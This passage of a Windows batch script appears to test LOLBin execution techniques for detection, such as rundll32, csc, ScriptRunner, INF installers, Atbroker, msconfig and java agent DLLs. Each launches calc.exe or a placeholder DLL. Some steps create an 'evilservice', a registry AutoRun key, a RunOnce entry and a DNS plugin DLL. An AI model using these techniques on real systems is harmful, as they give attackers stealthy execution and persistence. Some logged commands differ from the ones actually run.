REM start line 441
REM end line 648


start "" cmd /c rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
echo Execution Finished at %time% %date% 
echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
timeout 5

echo %time% %date% [+] Testing Shdocvw exec via rundll32
echo [InternetShortcut] > C:\windows\temp\url.url
echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
start "" cmd /c rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
echo Execution Finished at %time% %date%
echo Command Excuted: [InternetShortcut] > C:\windows\temp\url.url
echo Command Excuted: URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url

timeout 5

echo %time% %date% [+] Testing csc exec

echo public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs

start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
start "" cmd /c  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
start "" cmd /c  payload.exe
echo Execution Finished at %time% %date%
echo Command Excuted: public class x{public static void Main(){System.Diagnostics.Process.Start("calc");}} >>  payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Csc.exe /out:payload.exe payload.cs
echo Command Excuted: payload.exe 
timeout 5
echo %time% %date% [+] Testing advpack exec
start "" cmd /c rundll32.exe advpack.dll,RegisterOCX calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: rundll32.exe advpack.dll,RegisterOCX calc.exe
timeout 5
echo %time% %date% [+] Testing Scriptrunner exec
start "" cmd /c scriptrunner.exe -appvscript calc.exe   
echo Execution Finished at %time% %date%
echo Command Excuted: scriptrunner.exe -appvscript calc.exe

timeout 5

echo %time% %date% [+] Testing SC exec
start "" cmd /c sc create evilservice binPath= "C:\windows\system32\calc.exe" DisplayName= "evilservice" start= auto     
start "" cmd /c sc start evilservice     
echo Execution Finished at %time% %date%
echo Command Excuted: sc create evilservice binPath= "C:\windows\system32\cmd.exe /c calc.exe" DisplayName= "evilservice" start= auto  
echo Command Excuted: sc start evilservice

timeout 5

echo %time% %date% [+] Testing Register-cimprovider exec
start "" cmd /c Register-cimprovider -path "AllTheThings.dll"   
echo Execution Finished at %time% %date%
echo Command Excuted: Register-cimprovider -path "AllTheThings.dll"   

timeout 5

echo %time% %date% [+] Testing control.exe exec
start "" cmd /c control.exe AllTheThings.dll
echo Execution Finished at %time% %date%
echo Command Excuted: control.exe AllTheThings.dll


timeout 5

echo %time% %date% [+] Testing manage-bde.wsf exec
set comspec=C:\windows\system32\calc.exe
start "" cmd /c cscript C:\windows\system32\manage-bde.wsf 
echo Execution Finished at %time% %date%
echo Command Excuted: set comspec=C:\windows\system32\calc.exe
echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf 
REM Reset ComSpec
set comspec=C:\WINDOWS\system32\cmd.exe

timeout 5

echo %time% %date% [+] Testing AppVLP.exe exec
start "" cmd /c "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe

timeout 5

echo %time% %date% [+] Testing ScriptRunner.exe exec
start "" cmd /c C:\Windows\System32\ScriptRunner.exe -appvscript cmd.exe
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Windows\System32\ScriptRunner.exe -appvscript calc.exe

timeout 5

echo %time% %date% [+] Testing Pester.bat (PS3.0) exec
start "" cmd /c C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"

timeout 5

echo %time% %date% [+] Testing powershellcustomhost.exe exec
echo Start-Process calc.exe > calc.ps1
start "" cmd /c "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1
echo Execution Finished at %time% %date%
echo Command Excuted: "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1

timeout 5

echo %time% %date% [+] Testing PresentationHosts.exe exec
start "" cmd /c PresentationHost.exe file://c:\windows\system32\calc.exe
echo Execution Finished at %time% %date%
echo Command Excuted: PresentationHost.exe file://c:\windows\system32\calc.exe
timeout 5


echo %time% %date% [+] Testing Command Processor.exe exec
start "" cmd /c reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
start "" cmd /c cmd.exe
echo Execution Finished at %time% %date%
echo Command Excuted: reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
echo Command Excuted: cmd.exe
timeout 5

echo %time% %date% [+] Testing gpup.exe exec
start "" cmd /c "C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe"
echo Execution Finished at %time% %date%
echo Command Excuted: C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe

timeout 5

echo ^; DRIVER.INF > calc2.inf
echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc2.inf
echo [Version] >> calc2.inf
echo Signature = "$CHICAGO$" >> calc2.inf
echo Class=61883 >> calc2.inf
echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc2.inf
echo Provider=%Msft% >> calc2.inf
echo DriverVer=06/21/2006,6.1.7600.16385 >> calc2.inf
echo [DestinationDirs] >> calc2.inf
echo DefaultDestDir = 1 >> calc2.inf
echo [DefaultInstall] >> calc2.inf
echo AddReg = CalcStart >> calc2.inf
echo [CalcStart] >> calc2.inf
echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc2.inf

echo %time% %date% [+] Testing VBoxDrvInst.exe exec
start "" cmd /c "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 
echo Execution Finished at %time% %date%
echo Command Excuted: "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 

timeout 5

echo %time% %date% [+] Testing InstallHinfSection exec
start "" cmd /c "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"
echo Execution Finished at %time% %date%
echo Command Excuted: "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"

timeout 5

echo %time% %date% [+] Testing Atbroker exec
start "" cmd /c "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
start "" cmd /c "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"
echo Execution Finished at %time% %date%
echo Command Excuted: "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
echo Command Excuted: "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"


timeout 5

echo %time% %date% [+] Testing MSCONFIG exec
echo ^<?xml version="1.0" ?^> > %windir%\System32\mscfgtlc.xml
echo ^<MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
echo ^<a NAME="LOLBin" PATH="%windir%\System32\cmd.exe" DEFAULT_OPT="" ADV_OPT="/c calc.exe" HELP="LOLBin MSCONFIGTOOLS"^/^> >> %windir%\System32\mscfgtlc.xml
echo ^</MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
start "" cmd /c msconfig.exe
echo Execution Finished at %time% %date%
echo Command Excuted: msconfig.exe



timeout 5



echo %time% %date% [+] Testing DNSCMD DLL exec
start "" cmd /c dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 
echo Execution Finished at %time% %date%
echo Command Excuted: dnscmd ops_dc /config /serverlevelplugindll AllTheThings.dll 

timeout 5

echo %time% %date% [+] Testing JAVA DLL exec
start "" cmd /c java.exe -agentpath:AllTheThings.dll 
start "" cmd /c java.exe -agentlib:AllTheThings.dll 
echo Execution Finished at %time% %date%
echo Command Excuted: java.exe -agentpath:AllTheThings.dll 
echo Command Excuted: java.exe -agentlib:AllTheThings.dll  

echo %time% %date% [+] Testing JAVA DLL exec
start "" cmd /c java.exe -agentpath:AllTheThings.dll 
start "" cmd /c java.exe -agentlib:AllTheThings.dll 
echo Execution Finished at %time% %date%
echo Command Excuted: java.exe -agentpath:AllTheThings.dll 
echo Command Excuted: java.exe -agentlib:AllTheThings.dll  

timeout 5
